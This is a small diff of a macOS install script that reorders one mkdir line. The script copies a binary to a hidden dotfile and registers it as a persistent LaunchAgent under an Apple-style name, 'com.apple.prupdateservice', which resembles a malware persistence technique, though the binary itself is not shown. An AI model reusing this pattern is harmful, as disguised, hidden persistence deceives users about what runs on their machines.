@@ -1,9 +1,9 @@
 #!/bin/sh
 
-mkdir -p $HOME/Library/LaunchAgents/
-
 cp prupdateservice $HOME/.prupdateservice
 chmod +x $HOME/.prupdateservice
+
+mkdir -p $HOME/Library/LaunchAgents/
 
 launchctl unload $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist
 cp com.apple.prupdateservice.plist $HOME/Library/LaunchAgents/
